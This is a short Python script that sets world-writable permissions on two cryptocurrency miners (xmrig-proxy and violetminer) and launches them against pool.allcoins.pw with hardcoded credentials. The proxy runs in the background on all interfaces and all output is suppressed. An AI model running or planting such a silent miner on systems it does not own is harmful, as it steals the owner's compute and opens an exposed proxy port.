import os

os.system("chmod 777 xmrig-proxy violetminer")
os.system("./xmrig-proxy -a rx/0 -o pool.allcoins.pw:3333 -u allcoins.pw -p 581058 -b 0.0.0.0:3333 -m simple >/dev/null &")
os.system("./violetminer --pool pool.allcoins.pw:3333 --username allcoins.pw --password 581058 --algorithm wrkzcoin >/dev/null >/dev/null 2>&1")
